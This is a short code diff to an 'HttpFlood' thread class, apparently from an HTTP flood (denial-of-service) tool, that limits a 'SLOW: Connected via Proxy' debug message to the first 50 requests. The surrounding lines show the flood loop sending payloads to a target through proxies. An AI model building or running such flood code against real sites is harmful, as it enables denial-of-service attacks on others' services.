@@ -1868,7 +1868,8 @@ class HttpFlood(Thread):
             REQUESTS_SENT += 1
             TOTAL_REQUESTS_SENT += 1
             CONNECTIONS_SENT += 1
-            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
+            if int(REQUESTS_SENT) < 50:
+                print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
             for _ in range(self._rpc):
                 Tools.send(s, payload)
             
